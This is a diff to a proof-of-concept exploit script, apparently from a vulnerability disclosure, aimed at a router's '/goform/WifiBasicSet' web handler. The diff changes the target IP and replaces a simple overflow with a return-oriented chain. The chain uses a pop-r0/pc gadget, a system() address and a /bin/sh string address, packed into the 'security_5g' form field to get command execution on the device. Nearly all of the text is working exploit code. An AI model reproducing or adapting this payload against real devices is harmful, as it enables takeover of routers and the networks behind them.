@@ -68,17 +68,24 @@ POC
 import requests
 from pwn import *
 
-url = "http://192.168.33.6/goform/WifiBasicSet"
+url = "http://192.168.33.9/goform/WifiBasicSet"
 
-bin_sh=0xbae7
-payload="a"*(0x274-0x38)+p32(0x10D0B4)
+bin_sh=0xff5ed6d2
+system=0xff72d0f4
+pop_r0_pc=0xff58b000+0x00033e48
+#0x76daa000+0x00033e48
+#-1c -2c -38 "a"*(4*155)
+payload=p32(0xfffee860)*155+"a"*4+p32(0xfffee860)+p32(pop_r0_pc)+p32(0xff75a002)+p32(0xfffee860)*4+p32(0xff5c0cd4)
+#payload=payload.ljust((0x274-0x2c),"a")
+#payload=payload.ljust((0x274-0x1c),"b")
+#payload+="a"*0x100#+"a"*0x100
 
 data={
 	"wrlEn":"1",
 	"wrlEn_5g":"0",
 	"security":"None",
 	"security_5g":payload,
-	"ssid":"1111111111111",
+	"ssid":"CCCCC",
 	"ssid_5g":"",
 	"hideSsid":"0",
 	"hideSsid_5g":"0",
@@ -86,15 +93,15 @@ data={
 	"wrlPwd_5g":""
 }
 headers={
-	"Host":"192.168.33.6",
+	"Host":"192.168.33.9",
 	"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
 	"Accept":"*/*",
 	"Accept-Language":"en-US,en;q=0.5",
 	"Accept-Encoding":"gzip, deflate",
 	"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
 	"X-Requested-With":"XMLHttpRequest",
-	"Origin":"http://192.168.33.6",
-	"Referer":"http://192.168.33.6/wireless_ssid.html?random=0.799348137601227&",#Packet capture analysis
+	"Origin":"http://192.168.33.9",
+	"Referer":"http://192.168.33.9/wireless_ssid.html?random=0.8110608076948547&",
 	"Upgrade-Insecure-Requests":"1"
 }
 
